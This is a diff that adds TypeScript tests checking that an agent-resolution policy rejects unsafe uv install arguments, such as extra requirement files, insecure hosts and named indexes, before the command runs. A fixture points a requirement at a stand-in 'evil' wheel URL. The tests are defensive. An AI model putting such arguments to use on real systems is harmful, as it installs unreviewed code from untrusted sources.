@@ -1325,6 +1325,69 @@ describe("agent resolution", () => {
     expect(recording.invocations).toHaveLength(1);
   });
 
+  it.each([
+    [
+      "separate requirement file",
+      ["--with-requirements", "requirements.txt"],
+      "package-manager-requirements",
+    ],
+    [
+      "inline requirement file",
+      ["--with-requirements=requirements.txt"],
+      "package-manager-requirements",
+    ],
+    [
+      "separate insecure host",
+      ["--allow-insecure-host", "packages.example.test"],
+      "network-origin",
+    ],
+    [
+      "inline insecure host",
+      ["--allow-insecure-host=packages.example.test"],
+      "network-origin",
+    ],
+  ] as const)("rejects unsafe uv input before executing the proposal: %s", async (
+    _name,
+    unsafeArguments,
+    capability,
+  ) => {
+    const manager = join(directory, "uv");
+    const verify = join(directory, "verify");
+    await Promise.all([
+      writeFile(manager, "#!/bin/sh\nexit 0\n"),
+      writeFile(verify, "#!/bin/sh\nprintf verified\n"),
+      writeFile(
+        join(directory, "requirements.txt"),
+        "tool @ https://evil.example.test/tool.whl\n",
+      ),
+    ]);
+    await Promise.all([chmod(manager, 0o755), chmod(verify, 0o755)]);
+    const allowedExecutables = [manager, verify];
+    const recording = new RecordingExecutor(proposal(action({
+      executable: manager,
+      arguments: [
+        "tool",
+        "install",
+        "tool==1.2.3",
+        ...unsafeArguments,
+      ],
+      workingDirectory: directory,
+    })));
+    const error = await Effect.runPromise(Effect.gen(function*() {
+      const service = yield* AgentResolution;
+      return yield* service.resolve({
+        policy: "agent-apply",
+        task: task(directory, { allowedExecutables }),
+        harness: harness(directory, allowedExecutables),
+      });
+    }).pipe(
+      Effect.provide(makeAgentResolutionLayer(recording.execute)),
+      Effect.flip,
+    ));
+    expect(error).toMatchObject({ capability });
+    expect(recording.invocations).toHaveLength(1);
+  });
+
   it("rejects conflicting uv index aliases before execution", async () => {
     const manager = join(directory, "uv");
     const verify = join(directory, "verify");
@@ -2646,6 +2709,10 @@ writeFileSync(${JSON.stringify(marker)}, JSON.stringify({
     ["clustered verbose find links", ["tool", "install", "tool==1.2.3", "-vf/tmp/unreviewed-wheels"]],
     ["clustered quiet find links", ["tool", "install", "tool==1.2.3", "-qf/path"]],
     ["named index", ["tool", "install", "tool==1.2.3", "--index", "evil=https://packages.example.test"]],
+    ["separate requirement file", ["tool", "install", "tool==1.2.3", "--with-requirements", "requirements.txt"]],
+    ["inline requirement file", ["tool", "install", "tool==1.2.3", "--with-requirements=requirements.txt"]],
+    ["separate insecure host", ["tool", "install", "tool==1.2.3", "--allow-insecure-host", "packages.example.test"]],
+    ["inline insecure host", ["tool", "install", "tool==1.2.3", "--allow-insecure-host=packages.example.test"]],
   ] as const)("rejects hostile uv registry option before spawning: %s", async (_name, arguments_) => {
     const root = await mkdtemp(join(tmpdir(), "canonfig-uv-option-"));
     try {
